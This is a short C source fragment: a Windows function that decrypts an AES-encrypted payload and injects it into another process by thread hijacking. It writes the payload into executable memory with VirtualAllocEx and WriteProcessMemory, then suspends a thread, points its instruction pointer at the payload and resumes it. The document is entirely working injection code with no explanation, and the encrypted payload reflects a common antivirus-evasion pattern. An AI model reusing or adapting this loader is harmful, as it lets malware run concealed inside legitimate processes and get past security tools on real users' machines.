int InjectCTX(int pid, HANDLE hProc, unsigned char *payload, unsigned int payload_len)
{

    HANDLE hThread = NULL;
    LPVOID pRemoteCode = NULL;
    CONTEXT ctx;

    // find a thread in target process
    hThread = FindThread(pid);
    if (hThread == NULL)
    {
        printf("Error, hijack unsuccessful.\n");
        return -1;
    }

    // Decrypt payload
    AESDecrypt((char *)payload, payload_len, (char *)key, sizeof(key));

    // perform payload injection
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);

    // execute the payload by hijacking a thread in target process
    SuspendThread(hThread);
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
#ifdef _M_IX86
    ctx.Eip = (DWORD_PTR)pRemoteCode;
#else
    ctx.Rip = (DWORD_PTR)pRemoteCode;
#endif
    SetThreadContext(hThread, &ctx);

    return ResumeThread(hThread);
}